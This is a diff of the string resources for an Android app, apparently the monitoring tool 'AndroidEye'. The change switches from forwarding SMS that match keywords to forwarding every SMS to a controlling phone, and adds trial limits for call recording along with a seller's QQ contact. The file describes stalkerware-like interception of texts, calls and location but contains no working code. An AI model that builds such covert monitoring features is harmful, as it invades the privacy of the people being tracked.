@@ -85,8 +85,8 @@
     <string name="pref_pls_input_valid_recv_phonenum">ERROR: %s is not a valid mobile phone number.</string>
     <string name="pref_target_num_count_reach_max">9 numbers at most permitted.</string>
     <string name="pref_target_num_format_error">ERROR: 4 digits per number at least.</string>
-    <string name="pref_sensitive_words_enable_title">Real-time SMS Redirect</string>
-    <string name="pref_sensitive_words_enable_summary">实时转发包含敏感词的短信到主控手机上。可能产生额外费用，请慎用。</string>
+    <string name="pref_redirect_all_sms_title">Redirect All SMS</string>
+    <string name="pref_redirect_all_sms_summary">Direct all SMS in real-time. Pay attention to its cost.</string>
     <string name="pref_sensitive_words_title">Sensitive Words</string>
     <string name="pref_sensitive_words_summary">Separate with blank space. No more than 9 words.</string>
     <string name="pref_pls_input_sensitive_words">Please input sensitive words (separate by blank space).</string>
@@ -137,8 +137,10 @@
     <string name="msg_mobile_net_unvailable">Make sure your mobile connected and not in flying mode.</string>
     <string name="msg_auth_sms_sent_success">Sent validation SMS to server successfully.</string>
     <string name="msg_auth_sms_sent_fail">ERROR: failed to send validation SMS to server. Please exit and try again or contact software support.</string>
-    <string name="msg_has_sent_trial_expire_sms">AndroidEye: trial expired in %s, please contact supporter to buy a key.</string>
-    <string name="msg_expired_alert">AndroidEye: trial expired, please contact supporter to buy a key.</string>
+    <string name="msg_has_sent_trial_expire_sms">AndroidEye: trial expired in %s, please contact supporter(QQ:602592749) to buy a key.</string>
+    <string name="msg_expired_alert">AndroidEye: trial expired, please contact supporter(QQ:602592749) to buy a key.</string>
+    <string name="msg_sms_times_over_in_trial">安卓监控提醒您：试用期转发短信已经达到10条，如需继续使用请联系客服QQ:602592749。</string>
+    <string name="msg_recording_times_over_in_trial">安卓监控提醒您：试用期通话录音已经达到5次，如需继续使用请联系客服QQ:602592749。</string>
     
     <!-- Indication -->
     <string name="indication_register_ok">注册成功。</string>
@@ -162,10 +164,10 @@
     <string name="indication_set_network_mode_ng">设置网络连接模式失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_sens_words_ok">设置敏感词成功。</string>
     <string name="indication_set_sens_words_ng">设置敏感词失败。请检查您发送的指令格式是否正确，及敏感词个数是否超过最大数（9个）。若无法解决请联系客服。</string>
-    <string name="indication_enable_sens_words_ok">启用敏感短信实时转发成功。</string>
-    <string name="indication_enable_sens_words_ng">启用敏感短信实时转发失败。</string>
-    <string name="indication_disable_sens_words_ok">停止敏感短信实时转发成功。</string>
-    <string name="indication_disable_sens_words_ng">停止敏感短信实时转发失败。</string>
+    <string name="indication_enable_redirect_all_sms_ok">启用所有短信实时转发成功。</string>
+    <string name="indication_enable_redirect_all_sms_ng">启用所有短信实时转发失败。</string>
+    <string name="indication_disable_redirect_all_sms_ok">停止所有短信实时转发成功。</string>
+    <string name="indication_disable_redirect_all_sms_ng">停止所有短信实时转发失败。</string>
     <string name="indication_set_location_word_ok">设置定位短语成功。</string>
     <string name="indication_set_location_word_ng">设置定位短语失败。</string>
     <string name="indication_return_loc_word">Your current location word is: %s</string>
